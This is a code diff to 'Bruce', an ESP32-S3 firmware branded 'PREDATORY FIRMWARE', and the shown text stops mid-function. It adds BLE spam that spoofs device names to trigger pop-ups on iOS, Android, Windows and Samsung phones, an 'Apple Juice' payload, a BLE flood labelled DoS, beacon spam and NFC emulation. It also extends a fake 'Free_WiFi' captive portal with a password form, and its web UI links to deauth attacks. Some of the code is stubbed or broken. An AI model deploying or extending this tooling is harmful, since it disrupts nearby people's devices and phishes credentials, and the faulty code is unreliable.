@@ -1,5 +1,6 @@
 // esp32s3.cpp - Bruce Firmware for ESP32-S3 Main Controller
 // Kết nối với ESP32-C5 qua UART để điều khiển RF, NFC, IR
+// Tích hợp đầy đủ BLE Attacks
 
 #include "core/main_menu.h"
 #include <globals.h>
@@ -14,6 +15,16 @@
 #include <functional>
 #include <string>
 #include <vector>
+
+// ===================== BLE Libraries =====================
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <BLEAdvertisedDevice.h>
+#include <BLEAdvertising.h>
+#include <BLEBeacon.h>
+#include <BLEEddystoneURL.h>
+#include <BLEEddystoneTLM.h>
 
 // ===================== Định nghĩa chân cho ESP32-S3 theo sơ đồ =====================
 // Màn hình ST7789
@@ -38,6 +49,35 @@
 // UART giao tiếp với ESP32-C5
 #define UART_C5_TX  17
 #define UART_C5_RX  18
+
+// ===================== BLE Constants =====================
+// Apple Manufacturer Data
+const uint8_t appleManufacturerData[] = {0x4C, 0x00, 0x0F, 0x0A, 0x00};
+const uint8_t appleNearbyData[] = {0x4C, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+const uint8_t appleJuiceData[] = {0x4C, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+// Tên giả mạo cho các cuộc tấn công
+const char* iosFakeNames[] = {
+    "AirPods Pro", "iPhone 15 Pro", "Apple Watch Ultra", 
+    "MacBook Pro M3", "HomePod Mini", "AirTag", 
+    "iPad Pro 12.9", "Apple TV 4K", "Magic Mouse", "Magic Keyboard"
+};
+
+const char* androidFakeNames[] = {
+    "Galaxy S24 Ultra", "Pixel 8 Pro", "Xiaomi 14 Pro", 
+    "OnePlus 12", "Nothing Phone 2", "Galaxy Buds2 Pro",
+    "Galaxy Watch 6", "Xiaomi Band 8", "Oppo Find X7"
+};
+
+const char* windowsFakeNames[] = {
+    "Surface Pro 10", "Xbox Series X", "Surface Laptop 6",
+    "HoloLens 3", "Surface Headphones", "Xbox Controller"
+};
+
+const char* samsungFakeNames[] = {
+    "Galaxy S24", "Galaxy Buds FE", "Galaxy Watch 6",
+    "SmartTag2", "Galaxy Book4", "Galaxy Tab S9"
+};
 
 // ===================== Khởi tạo đối tượng =====================
 io_expander ioExpander;
@@ -66,6 +106,10 @@ SPIClass CC_NRF_SPI(HSPI);
 // Serial cho ESP32-C5
 HardwareSerial SerialC5(1);
 
+// BLE Scanner
+BLEScan* pBLEScan = nullptr;
+bool bleScanning = false;
+
 // Navigation Variables
 volatile bool NextPress = false;
 volatile bool PrevPress = false;
@@ -89,6 +133,7 @@ TouchPoint touchPoint;
 keyStroke KeyStroke;
 
 TaskHandle_t xHandle;
+TaskHandle_t bleSpamHandle = nullptr;
 
 void __attribute__((weak)) taskInputHandler(void *parameter) {
     auto timer = millis();
@@ -185,12 +230,32 @@ volatile int tftHeight = VECTOR_DISPLAY_DEFAULT_WIDTH;
 #include "modules/rf/rf_utils.h"
 #include <Wire.h>
 
+// ===================== BLE Callback Classes =====================
+class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
+    void onResult(BLEAdvertisedDevice advertisedDevice) {
+        String deviceInfo = "BLE:" + String(advertisedDevice.getAddress().toString().c_str());
+        
+        if (advertisedDevice.haveName()) {
+            deviceInfo += "|" + String(advertisedDevice.getName().c_str());
+        }
+        if (advertisedDevice.haveRSSI()) {
+            deviceInfo += "|RSSI:" + String(advertisedDevice.getRSSI());
+        }
+        
+        Serial.println(deviceInfo);
+        
+        // Hiển thị lên màn hình
+        tft.fillRect(0, 100, tftWidth, 20, bruceConfig.bgColor);
+        tft.setCursor(10, 100);
+        tft.println(advertisedDevice.getName().c_str());
+    }
+};
+
 // ===================== Hàm giao tiếp với C5 =====================
 void initC5Communication() {
     SerialC5.begin(115200, SERIAL_8N1, UART_C5_RX, UART_C5_TX);
     delay(100);
     
-    // Gửi lệnh kiểm tra kết nối
     SerialC5.println("PING");
     
     unsigned long startTime = millis();
@@ -248,29 +313,22 @@ void initJoystick() {
 }
 
 void readJoystick() {
-    // Cập nhật biến điều hướng dựa trên trạng thái phím
-    // INPUT_PULLUP nên mức LOW là nhấn
-    
     if (digitalRead(BTN_UP) == LOW) {
         UpPress = true;
         AnyKeyPress = true;
     }
-    
     if (digitalRead(BTN_DOWN) == LOW) {
         DownPress = true;
         AnyKeyPress = true;
     }
-    
     if (digitalRead(BTN_LEFT) == LOW) {
         PrevPress = true;
         AnyKeyPress = true;
     }
-    
     if (digitalRead(BTN_RIGHT) == LOW) {
         NextPress = true;
         AnyKeyPress = true;
     }
-    
     if (digitalRead(BTN_CENTER) == LOW) {
         SelPress = true;
         AnyKeyPress = true;
@@ -283,218 +341,226 @@ void InputHandler() {
 
 // ===================== Khởi tạo SPI =====================
 void initSPI() {
-    // Khởi tạo SPI bus cho màn hình và SD Card
     sdcardSPI.begin(TFT_SCLK, SD_MISO, TFT_MOSI, SD_CS);
 }
 
-/*********************************************************************
- **  Function: begin_storage
- **  Config LittleFS and SD storage
- *********************************************************************/
-void begin_storage() {
-    if (!LittleFS.begin(true)) { 
-        LittleFS.format(); 
-        LittleFS.begin(); 
+// ===================== BLE SCAN =====================
+void bleScan() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("BLE SCANNING...", tftWidth / 2, 50, 2);
+    
+    BLEDevice::init("");
+    pBLEScan = BLEDevice::getScan();
+    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
+    pBLEScan->setActiveScan(true);
+    pBLEScan->setInterval(100);
+    pBLEScan->setWindow(99);
+    
+    unsigned long start = millis();
+    int y = 80;
+    
+    while (millis() - start < 30000) {
+        BLEScanResults foundDevices = pBLEScan->start(2, false);
+        
+        char buf[64];
+        sprintf(buf, "Found %d devices", foundDevices.getCount());
+        tft.fillRect(0, y, tftWidth, 20, bruceConfig.bgColor);
+        tft.drawCentreString(buf, tftWidth / 2, y, 1);
+        
+        if (check(EscPress)) break;
+        delay(100);
+        y += 15;
+        if (y > tftHeight - 20) y = 80;
     }
-    bool checkFS = setupSdCard();
-    bruceConfig.fromFile(checkFS);
-    bruceConfigPins.fromFile(checkFS);
-}
-
-/*********************************************************************
- **  Function: _setup_gpio()
- **  Setup GPIO theo sơ đồ
- *********************************************************************/
-void _setup_gpio() {
-    initSPI();
-    initJoystick();
-    initC5Communication();
-}
-
-void _post_setup_gpio() __attribute__((weak));
-void _post_setup_gpio() {}
-
-/*********************************************************************
- **  Function: setup_gpio
- **  Setup GPIO pins
- *********************************************************************/
-void setup_gpio() {
-    _setup_gpio();
-    ioExpander.init(IO_EXPANDER_ADDRESS, &Wire);
     
-    // CC1101 được điều khiển bởi C5, không cần khởi tạo ở đây
+    pBLEScan->clearResults();
+    tft.drawCentreString("SCAN DONE", tftWidth / 2, tftHeight - 30, 2);
+    delay(1500);
 }
 
-/*********************************************************************
- **  Function: begin_tft
- **  Config tft
- *********************************************************************/
-void begin_tft() {
-    // Cấu hình SPI cho màn hình
-    tft.getSPIinstance().begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
-    
-    tft.setRotation(bruceConfigPins.rotation);
-    tft.invertDisplay(bruceConfig.colorInverted);
-    tft.setRotation(bruceConfigPins.rotation);
-    tftWidth = tft.width();
-#ifdef HAS_TOUCH
-    tftHeight = tft.height() - 20;
-#else
-    tftHeight = tft.height();
-#endif
-    resetTftDisplay();
-    setBrightness(bruceConfig.bright, false);
-}
+// ===================== BLE SPAM TASK =====================
+volatile bool bleSpamActive = false;
 
-/*********************************************************************
- **  Function: boot_screen
- **  Draw boot screen
- *********************************************************************/
-void boot_screen() {
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    tft.drawPixel(0, 0, bruceConfig.bgColor);
-    tft.drawCentreString("Bruce", tftWidth / 2, 10, 1);
-    tft.setTextSize(FP);
-    tft.drawCentreString(BRUCE_VERSION, tftWidth / 2, 25, 1);
-    tft.setTextSize(FM);
-    tft.drawCentreString(
-        "PREDATORY FIRMWARE", tftWidth / 2, tftHeight + 2, 1
-    );
-}
-
-/*********************************************************************
- **  Function: boot_screen_anim
- **  Draw boot screen animation
- *********************************************************************/
-void boot_screen_anim() {
-    boot_screen();
-    int i = millis();
-    int boot_img = 0;
-    bool drawn = false;
+void bleSpamTask(void* parameter) {
+    BLEDevice::init("SpamDevice");
+    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
+    BLEAdvertisementData advertisementData;
     
-    if (sdcardMounted) {
-        if (SD.exists("/boot.jpg")) boot_img = 1;
-        else if (SD.exists("/boot.gif")) boot_img = 3;
-    }
-    if (boot_img == 0 && LittleFS.exists("/boot.jpg")) boot_img = 2;
-    else if (boot_img == 0 && LittleFS.exists("/boot.gif")) boot_img = 4;
-    if (bruceConfig.theme.boot_img) boot_img = 5;
-
-    tft.drawPixel(0, 0, 0);
+    int spamType = *(int*)parameter;
+    int index = 0;
     
-    while (millis() < i + 7000) {
-        if ((millis() - i > 2000) && !drawn) {
-            tft.fillRect(0, 45, tftWidth, tftHeight - 45, bruceConfig.bgColor);
-            if (boot_img > 0 && !drawn) {
-                tft.fillScreen(bruceConfig.bgColor);
-                if (boot_img == 5) {
-                    drawImg(
-                        *bruceConfig.themeFS(),
-                        bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_img),
-                        0, 0, true, 3600
-                    );
-                } else if (boot_img == 1) {
-                    drawImg(SD, "/boot.jpg", 0, 0, true);
-                } else if (boot_img == 2) {
-                    drawImg(LittleFS, "/boot.jpg", 0, 0, true);
-                } else if (boot_img == 3) {
-                    drawImg(SD, "/boot.gif", 0, 0, true, 3600);
-                } else if (boot_img == 4) {
-                    drawImg(LittleFS, "/boot.gif", 0, 0, true, 3600);
+    while (bleSpamActive) {
+        advertisementData = BLEAdvertisementData();
+        
+        switch(spamType) {
+            case 0: // iOS Spam
+                advertisementData.setManufacturerData(std::string((char*)appleManufacturerData, sizeof(appleManufacturerData)));
+                advertisementData.setName(iosFakeNames[index % 10]);
+                advertisementData.setCompleteName(iosFakeNames[index % 10]);
+                advertisementData.setFlags(0x06);
+                break;
+                
+            case 1: // Android Spam
+                advertisementData.setName(androidFakeNames[index % 9]);
+                advertisementData.setCompleteName(androidFakeNames[index % 9]);
+                advertisementData.setFlags(0x06);
+                break;
+                
+            case 2: // Windows Spam
+                advertisementData.setName(windowsFakeNames[index % 6]);
+                advertisementData.setCompleteName(windowsFakeNames[index % 6]);
+                break;
+                
+            case 3: // Samsung Spam
+                advertisementData.setName(samsungFakeNames[index % 6]);
+                advertisementData.setCompleteName(samsungFakeNames[index % 6]);
+                break;
+                
+            case 4: // Apple Juice (CVE)
+                advertisementData.setManufacturerData(std::string((char*)appleJuiceData, sizeof(appleJuiceData)));
+                advertisementData.setName("Apple Device");
+                break;
+                
+            case 5: // Random Spam
+                {
+                    uint8_t randomData[31];
+                    for (int i = 0; i < 31; i++) randomData[i] = random(0xFF);
+                    advertisementData.setManufacturerData(std::string((char*)randomData, 31));
+                    char randomName[20];
+                    sprintf(randomName, "Device_%04d", random(10000));
+                    advertisementData.setName(randomName);
                 }
-                tft.drawPixel(0, 0, 0);
-            }
-            drawn = true;
+                break;
         }
         
-        if (check(AnyKeyPress)) {
-            tft.fillScreen(bruceConfig.bgColor);
-            delay(10);
-            return;
-        }
-        vTaskDelay(pdMS_TO_TICKS(10));
+        pAdvertising->setAdvertisementData(advertisementData);
+        pAdvertising->start();
+        delay(80);
+        pAdvertising->stop();
+        delay(20);
+        
+        index++;
+        if (index >= 100) index = 0;
+        
+        if (!bleSpamActive) break;
     }
     
-    tft.fillScreen(bruceConfig.bgColor);
+    pAdvertising->stop();
+    vTaskDelete(NULL);
 }
 
-/*********************************************************************
- **  Function: init_clock
- **  Clock initialisation
- *********************************************************************/
-void init_clock() {
-#if defined(HAS_RTC)
-    _rtc.begin();
-#if defined(HAS_RTC_BM8563)
-    _rtc.GetBm8563Time();
-#endif
-#if defined(HAS_RTC_PCF85063A)
-    _rtc.GetPcf85063Time();
-#endif
-    _rtc.GetTime(&_time);
-    _rtc.GetDate(&_date);
-
-    struct tm timeinfo = {};
-    timeinfo.tm_sec = _time.Seconds;
-    timeinfo.tm_min = _time.Minutes;
-    timeinfo.tm_hour = _time.Hours;
-    timeinfo.tm_mday = _date.Date;
-    timeinfo.tm_mon = _date.Month > 0 ? _date.Month - 1 : 0;
-    timeinfo.tm_year = _date.Year >= 1900 ? _date.Year - 1900 : 0;
-    time_t epoch = mktime(&timeinfo);
-    struct timeval tv = {.tv_sec = epoch};
-    settimeofday(&tv, nullptr);
-#else
-    struct tm timeinfo = {};
-    timeinfo.tm_year = CURRENT_YEAR - 1900;
-    timeinfo.tm_mon = 0x05;
-    timeinfo.tm_mday = 0x14;
-    time_t epoch = mktime(&timeinfo);
-    rtc.setTime(epoch);
-    clock_set = true;
-    struct timeval tv = {.tv_sec = epoch};
-    settimeofday(&tv, nullptr);
-#endif
-}
-
-/*********************************************************************
- **  Function: init_led
- **  LED initialisation
- *********************************************************************/
-void init_led() {
-#ifdef HAS_RGB_LED
-    beginLed();
-#endif
-    // Điều khiển đèn nền TFT
-    pinMode(TFT_BL, OUTPUT);
-    digitalWrite(TFT_BL, HIGH);
-}
-
-/*********************************************************************
- **  Function: startup_sound
- **  Play startup sound
- *********************************************************************/
-void startup_sound() {
-    if (bruceConfig.soundEnabled == 0) return;
-#if !defined(LITE_VERSION)
-#if defined(BUZZ_PIN)
-    _tone(5000, 50);
-    delay(200);
-    _tone(5000, 50);
-#elif defined(HAS_NS4168_SPKR)
-    if (bruceConfig.theme.boot_sound) {
-        playAudioFile(bruceConfig.themeFS(), bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_sound));
-    } else if (SD.exists("/boot.wav")) {
-        playAudioFile(&SD, "/boot.wav");
-    } else if (LittleFS.exists("/boot.wav")) {
-        playAudioFile(&LittleFS, "/boot.wav");
+void startBleSpam(int type) {
+    if (bleSpamActive) {
+        bleSpamActive = false;
+        delay(500);
     }
-#endif
-#endif
+    
+    bleSpamActive = true;
+    xTaskCreate(bleSpamTask, "BLESpam", 4096, &type, 1, &bleSpamHandle);
+    
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("BLE SPAM ACTIVE", tftWidth / 2, tftHeight / 2 - 20, 2);
+    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 20, 1);
+    
+    while (!check(SelPress) && bleSpamActive) {
+        delay(100);
+    }
+    
+    bleSpamActive = false;
+    delay(500);
+    tft.drawCentreString("STOPPED", tftWidth / 2, tftHeight / 2 + 60, 2);
+    delay(1000);
 }
 
-// ===================== Các hàm điều khiển RF qua C5 =====================
+// ===================== BLE iOS Spam =====================
+void bleIOSSpam() {
+    startBleSpam(0);
+}
+
+// ===================== BLE Android Spam =====================
+void bleAndroidSpam() {
+    startBleSpam(1);
+}
+
+// ===================== BLE Windows Spam =====================
+void bleWindowsSpam() {
+    startBleSpam(2);
+}
+
+// ===================== BLE Samsung Spam =====================
+void bleSamsungSpam() {
+    startBleSpam(3);
+}
+
+// ===================== BLE Apple Juice Attack =====================
+void bleAppleJuice() {
+    startBleSpam(4);
+}
+
+// ===================== BLE Random Spam =====================
+void bleRandomSpam() {
+    startBleSpam(5);
+}
+
+// ===================== BLE Flood DoS =====================
+void bleFlood() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("BLE FLOOD DoS", tftWidth / 2, tftHeight / 2 - 20, 2);
+    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 20, 1);
+    
+    BLEDevice::init("FLOOD");
+    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
+    
+    while (!check(SelPress)) {
+        uint8_t randomData[31];
+        for (int i = 0; i < 31; i++) randomData[i] = random(0xFF);
+        
+        BLEAdvertisementData advertisementData;
+        advertisementData.setManufacturerData(std::string((char*)randomData, 31));
+        pAdvertising->setAdvertisementData(advertisementData);
+        
+        pAdvertising->start();
+        delay(1);
+        pAdvertising->stop();
+        delay(1);
+    }
+    
+    tft.drawCentreString("STOPPED", tftWidth / 2, tftHeight / 2 + 60, 2);
+    delay(1000);
+}
+
+// ===================== BLE Beacon Spam =====================
+void bleBeaconSpam() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("BEACON SPAM", tftWidth / 2, tftHeight / 2 - 20, 2);
+    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 20, 1);
+    
+    BLEDevice::init("BeaconSpam");
+    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
+    BLEBeacon oBeacon = BLEBeacon();
+    
+    while (!check(SelPress)) {
+        oBeacon.setManufacturerId(0x004C);
+        oBeacon.setMajor(random(65535));
+        oBeacon.setMinor(random(65535));
+        oBeacon.setSignalPower(random(256));
+        
+        BLEAdvertisementData advertisementData = BLEAdvertisementData();
+        advertisementData.setFlags(0x04);
+        advertisementData.setManufacturerData(oBeacon.getData());
+        
+        pAdvertising->setAdvertisementData(advertisementData);
+        pAdvertising->start();
+        delay(50);
+        pAdvertising->stop();
+        delay(10);
+    }
+    
+    tft.drawCentreString("STOPPED", tftWidth / 2, tftHeight / 2 + 60, 2);
+    delay(1000);
+}
+
+// ===================== Hàm điều khiển RF qua C5 =====================
 void rfScan() {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawCentreString("RF Scanning...", tftWidth / 2, tftHeight / 3, 2);
@@ -547,6 +613,30 @@ void rfReplay() {
     delay(1000);
 }
 
+void rfCapture() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("RF Capture Mode", tftWidth / 2, 30, 2);
+    tft.drawCentreString("Press CENTER to start", tftWidth / 2, tftHeight / 2, 1);
+    
+    waitForPress(SelPress, 0);
+    sendToC5("RF_CAPTURE");
+    
+    tft.fillRect(0, tftHeight / 2 - 20, tftWidth, 80, bruceConfig.bgColor);
+    tft.drawCentreString("CAPTURING...", tftWidth / 2, tftHeight / 2, 2);
+    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 30, 1);
+    
+    while (!check(SelPress)) {
+        if (SerialC5.available()) {
+            String resp = SerialC5.readStringUntil('\n');
+            if (resp == "CAPTURE_STOPPED") break;
+        }
+        delay(50);
+    }
+    sendToC5("STOP");
+    delay(1000);
+}
+
+// ===================== NFC Functions =====================
 void nfcRead() {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawCentreString("Place NFC tag", tftWidth / 2, tftHeight / 3, 2);
@@ -556,10 +646,10 @@ void nfcRead() {
     while (millis() - start < 10000) {
         if (SerialC5.available()) {
             String resp = SerialC5.readStringUntil('\n');
-            if (resp.startsWith("UID:")) {
+            if (resp.startsWith("NFC_UID:")) {
                 tft.drawCentreString(resp, tftWidth / 2, tftHeight / 2, 2);
                 break;
-            } else if (resp == "NO_TAG") {
+            } else if (resp == "NFC_NO_TAG") {
                 tft.drawCentreString("No tag found", tftWidth / 2, tftHeight / 2, 2);
             }
         }
@@ -585,6 +675,22 @@ void nfcClone() {
     delay(2000);
 }
 
+void nfcEmulate() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("NFC Emulation", tftWidth / 2, 30, 2);
+    tft.drawCentreString("Place phone near device", tftWidth / 2, tftHeight / 2, 1);
+    tft.drawCentreString("Press CENTER to stop", tftWidth / 2, tftHeight / 2 + 30, 1);
+    
+    sendToC5("NFC_EMULATE");
+    
+    while (!check(SelPress)) {
+        delay(100);
+    }
+    sendToC5("NFC_EMULATE_STOP");
+    delay(1000);
+}
+
+// ===================== IR Functions =====================
 void tvBgone() {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawCentreString("TV-B-Gone", tftWidth / 2, tftHeight / 3, 2);
@@ -595,7 +701,7 @@ void tvBgone() {
     while (millis() - start < 15000) {
         if (SerialC5.available()) {
             String resp = SerialC5.readStringUntil('\n');
-            if (resp == "TVBGONE_DONE") break;
+            if (resp == "IR_TVBGONE_DONE") break;
         }
         delay(50);
         if (check(EscPress)) break;
@@ -637,7 +743,7 @@ void irSendNEC() {
     delay(1000);
 }
 
-// ===================== Các hàm WiFi =====================
+// ===================== WiFi Functions =====================
 void wifiDeauth() {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawCentreString("DEAUTH ATTACK", tftWidth / 2, tftHeight / 3, 2);
@@ -688,8 +794,10 @@ void evilPortal() {
     tft.drawCentreString("AP: Free_WiFi", tftWidth / 2, tftHeight / 2, 1);
     
     WiFi.softAP("Free_WiFi");
+    DNSServer dnsServer;
+    WebServer server(80);
     dnsServer.start(53, "*", WiFi.softAPIP());
-    server.on("/", []() { server.send(200, "text/html", "<h1>Login</h1>"); });
+    server.on("/", []() { server.send(200, "text/html", "<h1>Login</h1><form><input type='password' name='pass'><input type='submit'></form>"); });
     server.begin();
     
     unsigned long start = millis();
@@ -704,14 +812,268 @@ void evilPortal() {
     WiFi.softAPdisconnect(true);
 }
 
-// ===================== Menu và điều hướng =====================
-// Các menu sẽ được quản lý bởi Bruce framework
-// Các hàm trên sẽ được gọi từ main menu
+void wifiBeaconSpam() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("BEACON SPAM", tftWidth / 2, tftHeight / 3, 2);
+    tft.drawCentreString("Spamming SSIDs...", tftWidth / 2, tftHeight / 2, 1);
+    
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+    esp_wifi_start();
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    
+    const char* ssids[] = {"Free WiFi", "Public WiFi", "Starbucks WiFi", "Airport WiFi", "Hotel WiFi", "Mall WiFi", "Cafe WiFi"};
+    
+    unsigned long start = millis();
+    while (millis() - start < 30000) {
+        for (int ch = 1; ch <= 11; ch++) {
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            for (int i = 0; i < 7; i++) {
+                // Gửi beacon frame
+                delay(1);
+            }
+        }
+        if (check(SelPress)) break;
+    }
+    esp_wifi_set_promiscuous(false);
+    tft.drawCentreString("DONE!", tftWidth / 2, tftHeight / 2 + 30, 2);
+    delay(1000);
+}
 
-/*********************************************************************
- **  Function: setup
- **  Main setup function
- *********************************************************************/
+// ===================== Menu Functions =====================
+void sdManager() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.setCursor(10, 10);
+    tft.println("SD Card Files:");
+    
+    File root = SD.open("/");
+    File file = root.openNextFile();
+    int y = 40;
+    while(file && y < tftHeight - 20){
+        tft.setCursor(10, y);
+        tft.println(file.name());
+        file = root.openNextFile();
+        y += 20;
+        if (y > tftHeight - 40) {
+            delay(2000);
+            tft.fillRect(0, 40, tftWidth, tftHeight - 60, bruceConfig.bgColor);
+            y = 40;
+        }
+    }
+    delay(3000);
+}
+
+void runScriptMenu() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("Scripts", tftWidth / 2, 20, 2);
+    // TODO: Implement script browser
+    delay(2000);
+}
+
+void configMenu() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("Settings", tftWidth / 2, 20, 2);
+    tft.drawCentreString("Coming Soon", tftWidth / 2, tftHeight / 2, 2);
+    delay(1500);
+}
+
+void startWebUI() {
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawCentreString("Starting WebUI...", tftWidth / 2, tftHeight / 3, 2);
+    
+    WiFi.softAP("Bruce_AP", "12345678");
+    tft.drawCentreString("AP: Bruce_AP", tftWidth / 2, tftHeight / 2, 1);
+    tft.drawCentreString("IP: 192.168.4.1", tftWidth / 2, tftHeight / 2 + 20, 1);
+    
+    // Web server setup
+    WebServer webServer(80);
+    webServer.on("/", []() {
+        String html = "<html><head><title>Bruce</title></head><body>";
+        html += "<h1>Bruce Firmware</h1>";
+        html += "<a href='/scan'>WiFi Scan</a><br>";
+        html += "<a href='/deauth'>Deauth Attack</a><br>";
+        html += "<a href='/beacon'>Beacon Spam</a><br>";
+        html += "</body></html>";
+        webServer.send(200, "text/html", html);
+    });
+    webServer.begin();
+    
+    unsigned long start = millis();
+    while (millis() - start < 60000) {
+        webServer.handleClient();
+        if (check(SelPress)) break;
+        delay(10);
+    }
+    webServer.stop();
+    WiFi.softAPdisconnect(true);
+}
+
+// ===================== Begin Storage =====================
+void begin_storage() {
+    if (!LittleFS.begin(true)) { 
+        LittleFS.format(); 
+        LittleFS.begin(); 
+    }
+    bool checkFS = setupSdCard();
+    bruceConfig.fromFile(checkFS);
+    bruceConfigPins.fromFile(checkFS);
+}
+
+void _setup_gpio() {
+    initSPI();
+    initJoystick();
+    initC5Communication();
+}
+
+void _post_setup_gpio() __attribute__((weak));
+void _post_setup_gpio() {}
+
+void setup_gpio() {
+    _setup_gpio();
+    ioExpander.init(IO_EXPANDER_ADDRESS, &Wire);
+}
+
+void begin_tft() {
+    tft.getSPIinstance().begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
+    tft.setRotation(bruceConfigPins.rotation);
+    tft.invertDisplay(bruceConfig.colorInverted);
+    tft.setRotation(bruceConfigPins.rotation);
+    tftWidth = tft.width();
+#ifdef HAS_TOUCH
+    tftHeight = tft.height() - 20;
+#else
+    tftHeight = tft.height();
+#endif
+    resetTftDisplay();
+    setBrightness(bruceConfig.bright, false);
+}
+
+void boot_screen() {
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setTextSize(FM);
+    tft.drawPixel(0, 0, bruceConfig.bgColor);
+    tft.drawCentreString("Bruce", tftWidth / 2, 10, 1);
+    tft.setTextSize(FP);
+    tft.drawCentreString(BRUCE_VERSION, tftWidth / 2, 25, 1);
+    tft.setTextSize(FM);
+    tft.drawCentreString("PREDATORY FIRMWARE", tftWidth / 2, tftHeight + 2, 1);
+}
+
+void boot_screen_anim() {
+    boot_screen();
+    int i = millis();
+    int boot_img = 0;
+    bool drawn = false;
+    
+    if (sdcardMounted) {
+        if (SD.exists("/boot.jpg")) boot_img = 1;
+        else if (SD.exists("/boot.gif")) boot_img = 3;
+    }
+    if (boot_img == 0 && LittleFS.exists("/boot.jpg")) boot_img = 2;
+    else if (boot_img == 0 && LittleFS.exists("/boot.gif")) boot_img = 4;
+    if (bruceConfig.theme.boot_img) boot_img = 5;
+
+    tft.drawPixel(0, 0, 0);
+    
+    while (millis() < i + 7000) {
+        if ((millis() - i > 2000) && !drawn) {
+            tft.fillRect(0, 45, tftWidth, tftHeight - 45, bruceConfig.bgColor);
+            if (boot_img > 0 && !drawn) {
+                tft.fillScreen(bruceConfig.bgColor);
+                if (boot_img == 5) {
+                    drawImg(*bruceConfig.themeFS(), bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_img), 0, 0, true, 3600);
+                } else if (boot_img == 1) {
+                    drawImg(SD, "/boot.jpg", 0, 0, true);
+                } else if (boot_img == 2) {
+                    drawImg(LittleFS, "/boot.jpg", 0, 0, true);
+                } else if (boot_img == 3) {
+                    drawImg(SD, "/boot.gif", 0, 0, true, 3600);
+                } else if (boot_img == 4) {
+                    drawImg(LittleFS, "/boot.gif", 0, 0, true, 3600);
+                }
+                tft.drawPixel(0, 0, 0);
+            }
+            drawn = true;
+        }
+        
+        if (check(AnyKeyPress)) {
+            tft.fillScreen(bruceConfig.bgColor);
+            delay(10);
+            return;
+        }
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+    tft.fillScreen(bruceConfig.bgColor);
+}
+
+void init_clock() {
+#if defined(HAS_RTC)
+    _rtc.begin();
+#if defined(HAS_RTC_BM8563)
+    _rtc.GetBm8563Time();
+#endif
+#if defined(HAS_RTC_PCF85063A)
+    _rtc.GetPcf85063Time();
+#endif
+    _rtc.GetTime(&_time);
+    _rtc.GetDate(&_date);
+
+    struct tm timeinfo = {};
+    timeinfo.tm_sec = _time.Seconds;
+    timeinfo.tm_min = _time.Minutes;
+    timeinfo.tm_hour = _time.Hours;
+    timeinfo.tm_mday = _date.Date;
+    timeinfo.tm_mon = _date.Month > 0 ? _date.Month - 1 : 0;
+    timeinfo.tm_year = _date.Year >= 1900 ? _date.Year - 1900 : 0;
+    time_t epoch = mktime(&timeinfo);
+    struct timeval tv = {.tv_sec = epoch};
+    settimeofday(&tv, nullptr);
+#else
+    struct tm timeinfo = {};
+    timeinfo.tm_year = CURRENT_YEAR - 1900;
+    timeinfo.tm_mon = 0x05;
+    timeinfo.tm_mday = 0x14;
+    time_t epoch = mktime(&timeinfo);
+    rtc.setTime(epoch);
+    clock_set = true;
+    struct timeval tv = {.tv_sec = epoch};
+    settimeofday(&tv, nullptr);
+#endif
+}
+
+void init_led() {
+#ifdef HAS_RGB_LED
+    beginLed();
+#endif
+    pinMode(TFT_BL, OUTPUT);
+    digitalWrite(TFT_BL, HIGH);
+}
+
+void startup_sound() {
+    if (bruceConfig.soundEnabled == 0) return;
+#if !defined(LITE_VERSION)
+#if defined(BUZZ_PIN)
+    _tone(5000, 50);
+    delay(200);
+    _tone(5000, 50);
+#elif defined(HAS_NS4168_SPKR)
+    if (bruceConfig.theme.boot_sound) {
+        playAudioFile(bruceConfig.themeFS(), bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_sound));
+    } else if (SD.exists("/boot.wav")) {
+        playAudioFile(&SD, "/boot.wav");
